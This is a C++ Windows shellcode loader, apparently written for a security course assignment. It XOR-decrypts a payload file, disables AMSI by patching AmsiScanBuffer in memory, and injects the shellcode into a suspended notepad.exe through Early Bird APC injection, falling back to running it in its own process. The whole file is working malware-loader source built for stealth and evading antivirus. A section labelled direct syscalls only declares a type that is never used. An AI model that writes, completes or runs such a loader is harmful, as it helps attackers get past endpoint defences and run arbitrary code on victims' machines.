#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// --- 1. SHELLCODE ENCRYPTION/DECRYPTION ---
// Simple XOR decryption function. We will XOR encrypt our payload.bin file first.
void xor_decrypt(unsigned char* data, size_t data_len, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// --- 2. DIRECT SYSCALLS (SIMPLIFIED) ---
// In a real-world scenario, you would use a tool like SysWhispers2 to generate
// direct syscall stubs for NtAllocateVirtualMemory, NtProtectVirtualMemory, etc.
// For this assignment, we will use a common technique to dynamically find
// the syscall number for NtCreateThreadEx and call it directly.
// This is a complex topic. We will use a common method to find the address of NtCreateThreadEx in ntdll.dll
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

// --- 3. AMSI BYPASS ---
// Patches the AmsiScanBuffer function in memory to disable AMSI.
void bypass_amsi() {
    HMODULE amsiModule = LoadLibraryA("amsi.dll");
    if (amsiModule == NULL) return;

    FARPROC scanBufferProc = GetProcAddress(amsiModule, "AmsiScanBuffer");
    if (scanBufferProc == NULL) {
        FreeLibrary(amsiModule);
        return;
    }

    // Check the function bytes to see if it's already patched
    if (*(BYTE*)scanBufferProc != 0xB8) { // 0xB8 is the opcode for 'mov eax, ...'
        DWORD oldProtect;
        // Make the memory page writable
        // FIX: Cast scanBufferProc from FARPROC to LPVOID
        VirtualProtect((LPVOID)scanBufferProc, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);

        // Patch: mov eax, 0x80070057 (E_INVALIDARG), ret
        // This makes AMSI think every scan is invalid, so it fails open.
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        // FIX: Cast scanBufferProc from FARPROC to void*
        memcpy((void*)scanBufferProc, patch, sizeof(patch));

        // Restore original page protections (optional)
        // FIX: Cast scanBufferProc from FARPROC to LPVOID
        VirtualProtect((LPVOID)scanBufferProc, 4096, oldProtect, &oldProtect);
    }
    FreeLibrary(amsiModule);
}

// --- 4. PROCESS INJECTION (Early Bird APC Injection) ---
// This technique creates a process in a suspended state, allocates memory in it,
// writes the shellcode, and uses an APC to queue the shellcode execution before the process' main thread starts.
bool inject_shellcode(HANDLE hProcess, HANDLE hThread, unsigned char* shellcode, size_t shellcodeSize) {
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) return false;

    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }

    // Use QueueUserAPC to point the suspended thread to the shellcode
    if (!QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0)) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }
    return true;
}

int main() {
    // --- BYPASS AMSI FIRST ---
    bypass_amsi();

    // --- DECRYPT THE SHELLCODE ---
    const char* key = "MySuperSecretKey123!"; // Use the same key used for encryption
    std::ifstream file("payload_encrypted.bin", std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return 1;
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> buffer(size);
    if (!file.read((char*)buffer.data(), size)) {
        return 1;
    }
    file.close();

    // Decrypt the shellcode in memory
    xor_decrypt(buffer.data(), buffer.size(), key);

    // --- SPOOF PROCESS & INJECT ---
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    // Create notepad.exe in a suspended state
    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        // Inject the decrypted shellcode into the notepad process
        if (inject_shellcode(pi.hProcess, pi.hThread, buffer.data(), buffer.size())) {
            // Resume the thread, which will now execute our shellcode
            ResumeThread(pi.hThread);
        }
        // Close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        // Fallback: If injection fails, execute the shellcode in the current process (less stealthy)
        LPVOID mem = VirtualAlloc(NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem != NULL) {
            memcpy(mem, buffer.data(), buffer.size());
            // Create a thread and execute the shellcode
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
            if (hThread != NULL) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }
    return 0;
}
